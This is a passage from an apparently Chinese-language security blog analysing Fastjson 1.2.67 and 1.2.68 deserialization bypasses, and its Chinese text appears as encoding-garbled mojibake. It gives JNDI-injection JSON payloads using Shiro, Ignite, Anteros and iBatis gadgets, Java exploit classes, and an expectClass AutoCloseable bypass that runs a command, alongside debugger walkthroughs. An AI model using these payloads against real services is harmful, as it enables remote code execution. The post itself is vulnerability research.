class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/Exploit\&quot;],\&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÂá†Êù°ÈìæÂ≠êÈÉΩÊòØÂà©Áî®ÁöÑjndiÊâìÁöÑÔºå‰πüÊòØÊãø‰∏Ä‰∫õÊñ∞ÁöÑÁ±ªÁªïÁöÑÈªëÂêçÂçï</p><h2 id="1-2-67ÊºèÊ¥ûÂàÜÊûê"><a href="#1-2-67ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="1.2.67ÊºèÊ¥ûÂàÜÊûê"></a>1.2.67ÊºèÊ¥ûÂàÜÊûê</h2><p>Ëøô‰∏™‰πüÊòØÈªëÂêçÂçïÁªïËøáÔºå‰∏çËøáÁî®Âà∞Âà∞‰∫ÜÊñ∞ÁöÑ‰∏úË•øÂ≠¶‰π†‰∏Ä‰∏ã</p><h3 id="ÂâçÊèêÊù°‰ª∂-2"><a href="#ÂâçÊèêÊù°‰ª∂-2" class="headerlink" title="ÂâçÊèêÊù°‰ª∂"></a>ÂâçÊèêÊù°‰ª∂</h3><ul><li>ÂºÄÂêØAutoTypeÔºõ</li><li>Fastjson &lt;&#x3D; 1.2.67Ôºõ</li><li>JNDIÊ≥®ÂÖ•Âà©Áî®ÊâÄÂèóÁöÑJDKÁâàÊú¨ÈôêÂà∂Ôºõ</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookupÁ±ªÈúÄË¶Åignite-core„ÄÅignite-jtaÂíåjta‰æùËµñÔºõ</li><li>org.apache.shiro.jndi.JndiObjectFactoryÁ±ªÈúÄË¶Åshiro-coreÂíåslf4j-api‰æùËµñÔºõ</li></ul><h3 id="ÊºèÊ¥ûÂéüÁêÜ-1"><a href="#ÊºèÊ¥ûÂéüÁêÜ-1" class="headerlink" title="ÊºèÊ¥ûÂéüÁêÜ"></a>ÊºèÊ¥ûÂéüÁêÜ</h3><p>Êñ∞GadgetÁªïËøáÈªëÂêçÂçïÈôêÂà∂„ÄÇ<br>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookupÁ±ªPoCÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023873.png" alt="image-20230828002317395"><br>org.apache.shiro.jndi.JndiObjectFactoryÁ±ªPoCÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023391.png" alt="image-20230828002342936"><br>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass67</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot; \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ë∞ÉËØïÂàÜÊûê-1"><a href="#Ë∞ÉËØïÂàÜÊûê-1" class="headerlink" title="Ë∞ÉËØïÂàÜÊûê"></a>Ë∞ÉËØïÂàÜÊûê</h3><p>Áúã‰∏Ä‰∏ãÂÖ≥ÈîÆÁöÑÂú∞Êñπ</p><h4 id="org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup"><a href="#org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup" class="headerlink" title="org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"></a>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4><p>Ê†πÊçÆPoCÔºö<code>&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;</code>ÂÖàË∞ÉÁî®jndiNamesÂ±ûÊÄßÁöÑ<code>setter</code>ÊñπÊ≥ïÔºåÊ≥®ÊÑèËøôÈáåÊé•Êî∂ÂèÇÊï∞Á±ªÂûãÊòØListÔºåÂõ†Ê≠§ÊûÑÈÄ†ÂØπÂ∫îÁöÑÂÄºÈúÄË¶ÅÊòØÊï∞ÁªÑÂΩ¢ÂºèÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024320.png" alt="image-20230828002401114"><br>ÁÑ∂ÂêéÊòØËøôÈáåÁöÑ<code>getTm()</code>ÂáΩÊï∞ÔºåÂõûÂøÜ‰∏Ä‰∏ãgetterÁöÑË∞ÉÁî®Ë¶ÅÊª°Ë∂≥ÁöÑÊù°‰ª∂ÔºåËøô‰∏™getterÂπ∂‰∏çÊª°Ë∂≥Ôºå‰ΩÜÊòØ‰∏∫‰ªÄ‰πàËÉΩË∞ÉÁî®Âà∞Âë¢ÔºüËøôÈáåÂ∞±Ê∂âÂèäÂà∞‰∫ÜFastjsonÂæ™ÁéØÂºïÁî®</p><h4 id="FastjsonÂæ™ÁéØÂºïÁî®"><a href="#FastjsonÂæ™ÁéØÂºïÁî®" class="headerlink" title="FastjsonÂæ™ÁéØÂºïÁî®"></a>FastjsonÂæ™ÁéØÂºïÁî®</h4><p>FastjsonÊîØÊåÅÂæ™ÁéØÂºïÁî®ÔºåÂπ∂‰∏îÊòØÈªòËÆ§ÊâìÂºÄÁöÑ„ÄÇÂèÇËÄÉÔºö<a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>Âú®Fastjson‰∏≠ÔºåÂæÄJSONArrayÁ±ªÂûãÁöÑÂØπË±°ÈáåÈù¢addÊï∞ÊçÆÊó∂ÔºåÂ¶ÇÊûúÊï∞ÊçÆÁõ∏ÂêåÔºåÈÇ£‰πàÂ∞±‰ºöË¢´ÊõøÊç¢Êàê<code>$ref</code>Ôºå‰πüÂ∞±ÊòØË¢´ÁÆÄÂåñ‰∫ÜÔºåÂõ†‰∏∫Êï∞ÊçÆ‰∏ÄÊ†∑ÊâÄ‰ª•Áõ¥Êé•ÊåáÂêë‰∏ä‰∏ÄÊù°Êï∞ÊçÆ„ÄÇ</p><p><code>$ref</code>Âç≥Âæ™ÁéØÂºïÁî®ÔºöÂΩì‰∏Ä‰∏™ÂØπË±°ÂåÖÂê´Âè¶‰∏Ä‰∏™ÂØπË±°Êó∂ÔºåFastjsonÂ∞±‰ºöÊääËØ•ÂØπË±°Ëß£ÊûêÊàêÂºïÁî®„ÄÇÂºïÁî®ÊòØÈÄöËøá<code>$ref</code>Ê†áÁ§∫ÁöÑ„ÄÇ</p><table><thead><tr><th>ËØ≠Ê≥ï</th><th>ÊèèËø∞</th></tr></thead><tbody><tr><td><code>&#123;&quot;$ref&quot;:&quot;$&quot;&#125;</code></td><td>ÂºïÁî®Ê†πÂØπË±°</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;@&quot;&#125;</code></td><td>ÂºïÁî®Ëá™Â∑±</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;..&quot;&#125;</code></td><td>ÂºïÁî®Áà∂ÂØπË±°</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;../..&quot;&#125;</code></td><td>ÂºïÁî®Áà∂ÂØπË±°ÁöÑÁà∂ÂØπË±°</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;&#125;</code></td><td>Âü∫‰∫éË∑ØÂæÑÁöÑÂºïÁî®</td></tr></tbody></table><p>ÈÇ£ËøôÊ†∑Â∞±Ê∏ÖÊ•ö‰∫ÜÔºåorg.apache.ignite.cache.jta.jndi.CacheJndiTmLookupÁ±ªPoC‰∏≠ÂêéÈù¢ÈÇ£ÊÆµÁöÑ<code>&#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;</code>ÔºåÂÆûÈôÖ‰∏äÂ∞±ÊòØÂü∫‰∫éË∑ØÂæÑÁöÑÂºïÁî®ÔºåÁõ∏ÂΩì‰∫éÊòØË∞ÉÁî®<code>root.getTm()</code>ÂáΩÊï∞ÔºåËøô‰∏™rootÈÄöÂ∏∏Ë°®Á§∫Êï¥‰∏™ JSON ÂØπË±°ÁöÑÊ†πÔºåËøõËÄåÁõ¥Êé•Ë∞ÉÁî®‰∫ÜtmÂ≠óÊÆµÁöÑ<code>getter</code>ÊñπÊ≥ï‰∫Ü„ÄÇ</p><h4 id="org-apache-shiro-jndi-JndiObjectFactory"><a href="#org-apache-shiro-jndi-JndiObjectFactory" class="headerlink" title="org.apache.shiro.jndi.JndiObjectFactory"></a>org.apache.shiro.jndi.JndiObjectFactory</h4><p>Ê†πÊçÆPoCÔºö<code>&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</code><br>ÂÖàË∞ÉÁî®resourceNameÂ±ûÊÄßÁöÑ<code>setter</code>ÊñπÊ≥ïËÆæÁΩÆÂ±ûÊÄßÂÄºÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024439.png" alt="image-20230828002421345"><br>ÂæÄ‰∏ãÔºåÂ∞±ÊòØÂíåÂâçÈù¢ÂêåÁêÜÁöÑÔºåÈÄöËøá<code>&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;</code>Âç≥Âæ™ÁéØÂºïÁî®Êù•Ë∞ÉÁî®instanceÁöÑ<code>getter</code>ÊñπÊ≥ïÔºåÂÖ∂‰∏≠Â≠òÂú®JNDIÊ≥®ÂÖ•ÊºèÊ¥ûÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024820.png" alt="image-20230828002446665"><br>ÁÑ∂ÂêéËøô‰∏™‰øÆÂ§ç‰πüÊòØÂä†ÈªëÂêçÂçï</p><h2 id="1-2-68ÊºèÊ¥ûÂàÜÊûêÔºàexpectClassÁªïËøáAutoTypeÔºâ"><a href="#1-2-68ÊºèÊ¥ûÂàÜÊûêÔºàexpectClassÁªïËøáAutoTypeÔºâ" class="headerlink" title="1.2.68ÊºèÊ¥ûÂàÜÊûêÔºàexpectClassÁªïËøáAutoTypeÔºâ"></a>1.2.68ÊºèÊ¥ûÂàÜÊûêÔºàexpectClassÁªïËøáAutoTypeÔºâ</h2><h3 id="ÂâçÊèêÊù°‰ª∂-3"><a href="#ÂâçÊèêÊù°‰ª∂-3" class="headerlink" title="ÂâçÊèêÊù°‰ª∂"></a>ÂâçÊèêÊù°‰ª∂</h3><ul><li>Fastjson &lt;&#x3D; 1.2.68Ôºõ</li><li>Âà©Áî®Á±ªÂøÖÈ°ªÊòØexpectClassÁ±ªÁöÑÂ≠êÁ±ªÊàñÂÆûÁé∞Á±ªÔºåÂπ∂‰∏î‰∏çÂú®ÈªëÂêçÂçï‰∏≠Ôºõ</li></ul><h3 id="ÊºèÊ¥ûÂéüÁêÜ-2"><a href="#ÊºèÊ¥ûÂéüÁêÜ-2" class="headerlink" title="ÊºèÊ¥ûÂéüÁêÜ"></a>ÊºèÊ¥ûÂéüÁêÜ</h3><p>Êú¨Ê¨°ÁªïËøá<code>checkAutoType()</code>ÂáΩÊï∞ÁöÑÂÖ≥ÈîÆÁÇπÂú®‰∫éÂÖ∂Á¨¨‰∫å‰∏™ÂèÇÊï∞expectClassÔºåÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèJSONÊï∞ÊçÆ„ÄÅ‰º†ÂÖ•Êüê‰∏™Á±ª‰Ωú‰∏∫expectClassÂèÇÊï∞ÂÜç‰º†ÂÖ•Âè¶‰∏Ä‰∏™expectClassÁ±ªÁöÑÂ≠êÁ±ªÊàñÂÆûÁé∞Á±ªÊù•ÂÆûÁé∞ÁªïËøá<code>checkAutoType()</code>ÂáΩÊï∞ÊâßË°åÊÅ∂ÊÑèÊìç‰Ωú„ÄÇ<br>ÁÆÄÂçïÂú∞ËØ¥ÔºåÊú¨Ê¨°ÁªïËøá<code>checkAutoType()</code>ÂáΩÊï∞ÁöÑÊîªÂáªÊ≠•È™§‰∏∫Ôºö</p><ol><li>ÂÖà‰º†ÂÖ•Êüê‰∏™Á±ªÔºåÂÖ∂Âä†ËΩΩÊàêÂäüÂêéÂ∞Ü‰Ωú‰∏∫expectClassÂèÇÊï∞‰º†ÂÖ•<code>checkAutoType()</code>ÂáΩÊï∞Ôºõ</li><li>Êü•ÊâæexpectClassÁ±ªÁöÑÂ≠êÁ±ªÊàñÂÆûÁé∞Á±ªÔºåÂ¶ÇÊûúÂ≠òÂú®ËøôÊ†∑‰∏Ä‰∏™Â≠êÁ±ªÊàñÂÆûÁé∞Á±ªÂÖ∂ÊûÑÈÄ†ÊñπÊ≥ïÊàñ<code>setter</code>ÊñπÊ≥ï‰∏≠Â≠òÂú®Âç±Èô©Êìç‰ΩúÂàôÂèØ‰ª•Ë¢´ÊîªÂáªÂà©Áî®Ôºõ</li></ol><h3 id="ÊºèÊ¥ûÂ§çÁé∞"><a href="#ÊºèÊ¥ûÂ§çÁé∞" class="headerlink" title="ÊºèÊ¥ûÂ§çÁé∞"></a>ÊºèÊ¥ûÂ§çÁé∞</h3><p>ÁÆÄÂçïÂú∞È™åËØÅÂà©Áî®expectClassÁªïËøáÁöÑÂèØË°åÊÄßÔºåÂÖàÂÅáËÆæFastjsonÊúçÂä°Á´ØÂ≠òÂú®Â¶Ç‰∏ãÂÆûÁé∞AutoCloseableÊé•Âè£Á±ªÁöÑÊÅ∂ÊÑèÁ±ªVulAutoCloseableÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;bypass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êó†ÈúÄÂºÄÂêØAutoTypeÔºåÁõ¥Êé•ÊàêÂäüÁªïËøá<code>CheckAutoType()</code>ÁöÑÊ£ÄÊµã‰ªéËÄåËß¶ÂèëÊâßË°åÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025028.png" alt="image-20230828002512553"></p><h3 id="Ë∞ÉËØïÂàÜÊûê-2"><a href="#Ë∞ÉËØïÂàÜÊûê-2" class="headerlink" title="Ë∞ÉËØïÂàÜÊûê"></a>Ë∞ÉËØïÂàÜÊûê</h3><p>ËøôÈáåÁõ¥Êé•Âú®checkAutoTypeÂáΩÊï∞‰∏ãÊñ≠ÁÇπÔºåÁúãÁúãÊÄé‰πàÁªïËøáÁöÑ<br>Á¨¨‰∏ÄÊ¨°ÊòØ‰º†ÂÖ•java.lang.AutoCloseableÁ±ªËøõË°åÊ†°È™åÔºåËøôÈáå<code>CheckAutoType()</code>ÂáΩÊï∞ÁöÑexpectClassÂèÇÊï∞ÊòØ‰∏∫nullÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025524.png" alt="image-20230828002535960"><br>ÁÑ∂ÂêéÁªßÁª≠ÂæÄ‰∏ãÔºå‰ªéÁºìÂ≠ò Mapping ‰∏≠Ëé∑ÂèñÂà∞‰∫Ü <code>AutoCloseable</code> Á±ªËµãÂÄºÁªô <code>clazz</code> ÂêéÂÜçËøõË°å‰∫Ü‰∏ÄÁ≥ªÂàóÁöÑÂà§Êñ≠Ôºå<code>clazz</code> ÊòØÂê¶‰∏∫ nullÔºå‰ª•ÂèäÂÖ≥‰∫é internalWhite ÁöÑÂà§Êñ≠ÔºåinternalWhite Â∞±ÊòØÂÜÖÈÉ®Âä†ÁôΩÁöÑÂêçÂçïÔºåÂæàÊòæÁÑ∂Êàë‰ª¨ËøôÈáåËÇØÂÆö‰∏çÊòØÔºåÂÜÖÈÉ®Âä†ÁôΩÁöÑÂêçÂçï‰∏ÄÂÆöÊòØÈùûÂ∏∏ÂÆâÂÖ®ÁöÑ„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026336.png" alt="image-20230828002602765"><br>ÁÑ∂ÂêéÂêéÈù¢Ëøô‰∏™Âà§Êñ≠ÈáåÈù¢Âá∫Áé∞‰∫Ü <code>expectClass</code>ÔºåÂÖàÂà§Êñ≠ <code>clazz</code> ÊòØÂê¶‰∏çÊòØ <code>expectClass</code> Á±ªÁöÑÁªßÊâøÁ±ª‰∏î‰∏çÊòØ <code>HashMap</code> Á±ªÂûãÔºåÊòØÁöÑËØùÊäõÂá∫ÂºÇÂ∏∏ÔºåÂê¶ÂàôÁõ¥Êé•ËøîÂõûËØ•Á±ª„ÄÇ<br>Êàë‰ª¨ËøôÈáåÊ≤°Êúâ <code>expectClass</code>ÔºåÊâÄ‰ª•‰ºöÁõ¥Êé•ËøîÂõû <code>AutoCloseable</code> Á±ªÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026753.png" alt="image-20230828002621537"><br>Êé•ÁùÄÔºåËøîÂõûÂà∞ <code>DefaultJSONParser</code> Á±ª‰∏≠Ëé∑ÂèñÂà∞ <code>clazz</code> ÂêéÂÜçÁªßÁª≠ÊâßË°åÔºåÊ†πÊçÆ <code>AutoCloseable</code> Á±ªËé∑ÂèñÂà∞ÂèçÂ∫èÂàóÂåñÂô®‰∏∫ <code>JavaBeanDeserializer</code>ÔºåÁÑ∂ÂêéÂ∫îÁî®ËØ•ÂèçÂ∫èÂàóÂåñÂô®ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026859.png" alt="image-20230828002641320"><br>ÁÑ∂ÂêéËøõÂÖ•deserialzeËøôÈáåÔºåË∞ÉÁî®ÁöÑÊòØ <code>JavaBeanDeserializer</code> ÁöÑ <code>deserialze()</code> ÊñπÊ≥ïËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåÂÖ∂‰∏≠ type ÂèÇÊï∞Â∞±ÊòØ‰º†ÂÖ•ÁöÑ <code>AutoCloseableÁ±ª</code>ÔºåÂ¶ÇÂõæÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026841.png" alt="image-20230828002657296"><br>ÂæÄ‰∏ãÁöÑÈÄªËæëÔºåÂ∞±ÊòØËß£ÊûêËé∑Âèñ PoC ÂêéÈù¢ÁöÑÁ±ªÁöÑËøáÁ®ã„ÄÇËøôÈáåÁúãÂà∞Ëé∑Âèñ‰∏çÂà∞ÂØπË±°ÂèçÂ∫èÂàóÂåñÂô®‰πãÂêéÔºåÂ∞±‰ºöËøõÂéªÂ¶ÇÂõæÁöÑÂà§Êñ≠ÈÄªËæë‰∏≠ÔºåËÆæÁΩÆ type ÂèÇÊï∞Âç≥ <code>java.lang.AutoCloseable</code> Á±ª‰∏∫ <code>checkAutoType()</code> ÊñπÊ≥ïÁöÑ expectClass ÂèÇÊï∞Êù•Ë∞ÉÁî® <code>checkAutoType()</code> ÂáΩÊï∞Êù•Ëé∑ÂèñÊåáÂÆöÁ±ªÂûãÔºåÁÑ∂ÂêéÂú®Ëé∑ÂèñÊåáÂÆöÁöÑÂèçÂ∫èÂàóÂåñÂô®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027403.png" alt="image-20230828002726832"><br>Ê≠§Êó∂ÔºåÁ¨¨‰∫åÊ¨°ËøõÂÖ• <code>checkAutoType()</code> ÂáΩÊï∞ÔºåtypeName ÂèÇÊï∞ÊòØ PoC ‰∏≠Á¨¨‰∫å‰∏™ÊåáÂÆöÁöÑÁ±ªÔºåexpectClass ÂèÇÊï∞ÂàôÊòØ PoC ‰∏≠Á¨¨‰∏Ä‰∏™ÊåáÂÆöÁöÑÁ±ª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027037.png" alt="image-20230828002751466"><br>ÂæÄ‰∏ãÔºåÁî±‰∫éjava.lang.AutoCloseableÁ±ªÂπ∂ÈùûÂÖ∂‰∏≠ÈªëÂêçÂçï‰∏≠ÁöÑÁ±ªÔºåÂõ†Ê≠§expectClassFlagË¢´ËÆæÁΩÆ‰∏∫trueÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028627.png" alt="image-20230828002810033"><br>ÂæÄ‰∏ãÔºåÁî±‰∫éexpectClassFlag‰∏∫true‰∏îÁõÆÊ†áÁ±ª‰∏çÂú®ÂÜÖÈÉ®ÁôΩÂêçÂçï‰∏≠ÔºåÁ®ãÂ∫èËøõÂÖ•AutoTypeÂºÄÂêØÊó∂ÁöÑÊ£ÄÊµãÈÄªËæë<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028295.png" alt="image-20230828002835724"><br>Áî±‰∫éorg.example.VulAutoCloseableÁ±ª‰∏çÂú®ÈªëÁôΩÂêçÂçï‰∏≠ÔºåÂõ†Ê≠§ËøôÊÆµËÉΩÈÄöËøáÊ£ÄÊµãÂπ∂ÁªßÁª≠ÂæÄ‰∏ãÊâßË°å„ÄÇ<br>ÂæÄ‰∏ãÔºåÊú™Âä†ËΩΩÊàêÂäüÁõÆÊ†áÁ±ªÔºåÂ∞±‰ºöËøõÂÖ•AutoTypeÂÖ≥Èó≠Êó∂ÁöÑÊ£ÄÊµãÈÄªËæëÔºåÂíå‰∏äÂêåÁêÜÔºåËøôÊÆµËÉΩÈÄöËøáÊ£ÄÊµãÂπ∂ÁªßÁª≠ÂæÄ‰∏ãÊâßË°åÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028628.png" alt="image-20230828002854090"><br>ÂæÄ‰∏ãÔºåÁî±‰∫éexpectClassFlag‰∏∫trueÔºåËøõÂÖ•Â¶Ç‰∏ãÁöÑ<code>loadClass()</code>ÈÄªËæëÊù•Âä†ËΩΩÁõÆÊ†áÁ±ªÔºå‰ΩÜÊòØÁî±‰∫éAutoTypeÂÖ≥Èó≠‰∏îjsonType‰∏∫falseÔºåÂõ†Ê≠§Ë∞ÉÁî®<code>loadClass()</code>ÂáΩÊï∞ÁöÑÊó∂ÂÄôÊòØ‰∏çÂºÄÂêØcacheÂç≥ÁºìÂ≠òÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029096.png" alt="image-20230828002912531"><br>Ë∑üËøõËØ•ÂáΩÊï∞Ôºå‰ΩøÁî®AppClassLoaderÂä†ËΩΩorg.example.VulAutoCloseableÁ±ªÂπ∂Áõ¥Êé•ËøîÂõûÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029024.png" 